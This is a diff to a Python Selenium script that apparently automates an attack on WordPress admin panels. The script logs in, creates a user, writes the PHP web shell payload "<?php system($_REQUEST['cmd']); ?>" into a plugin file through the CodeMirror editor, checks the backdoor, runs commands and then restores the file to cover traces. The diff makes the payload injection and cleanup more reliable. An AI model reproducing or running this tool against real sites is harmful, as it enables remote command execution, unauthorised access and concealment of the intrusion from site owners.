@@ -1,14 +1,14 @@
 #!/usr/bin/python3
 
 from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
+#from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.select import Select
 from bs4 import BeautifulSoup
 import urllib.parse
-import tkinter as tk
 import argparse, logging, sys, time
 
 FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
+P_BACKUP:str
 
 def login(user, password):
     logging.info(f'Login with user: {user}')
@@ -54,33 +54,18 @@ def crate_user():
 
 def write_payload(c_p_name, f_name):
     global P_BACKUP
-    global P_BACKUPX
     logging.info(f'Write Payload in Plugin:{c_p_name} with File:{f_name}')
     payload = "<?php system($_REQUEST['cmd']); ?>"
-    r = tk.Tk()
-    r.withdraw()
     try:
-        driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"a")
-        driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"c")
-        P_BACKUP = r.clipboard_get()
-        #soup = BeautifulSoup(driver.page_source, 'html.parser') 
-        #P_BACKUP = soup.find('textarea').text
-        if payload not in P_BACKUP:       
-            driver.find_element_by_xpath("//div[@role='textbox']").send_keys(payload)
-            driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.ENTER)
-            driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
+        P_BACKUP = driver.find_element_by_id("newcontent").get_attribute('value')
+        if payload not in P_BACKUP:
+            codeMirror = driver.find_element_by_class_name("CodeMirror")
+            driver.execute_script("arguments[0].CodeMirror.setValue(arguments[1]);", codeMirror, payload+P_BACKUP)
         else:
-            print("is there")
-            P_BACKUPX = P_BACKUP.replace(payload,'XXX')
-            print(P_BACKUP)
-            exit()
+            P_BACKUP = P_BACKUP.replace(payload,"")
     except Exception as e:
         print(f'Write Payload Failed : {e}')
         exit(-1)
-    #r.clipboard_clear()
-    #print(P_BACKUP)
-    r.update()
-    r.destroy()
     time.sleep(3)
 
 def cleanup():
@@ -88,23 +73,14 @@ def cleanup():
     try:
         driver.get(EDIT_PLUGIN_URL)
         time.sleep(1)
-        driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"a")
-        driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.DELETE)
+        codeMirror = driver.find_element_by_class_name("CodeMirror")
+        driver.execute_script("arguments[0].CodeMirror.setValue(arguments[1]);", codeMirror, P_BACKUP)
         time.sleep(1)
-        r = tk.Tk()
-        r.withdraw()
-        r.clipboard_clear()
-        #print(P_BACKUPX)
-        r.clipboard_append(P_BACKUPX)
-        driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
         time.sleep(2)
         driver.find_element_by_xpath("//input[@value='Update File']").click()
-
     except Exception as e:
         print(f'Cleanup Failed : {e}')
         exit(-1)
-    r.update()
-    r.destroy()
     time.sleep(3)
 
 def edit_plugin():
@@ -199,6 +175,7 @@ def main():
         time.sleep(1)
         check_backdoor(p_name, f_name)
         cmd()
+    time.sleep(2)
     #driver.get(args.url+'/wp-admin/index.php')
     print("\n| End")
     exit()
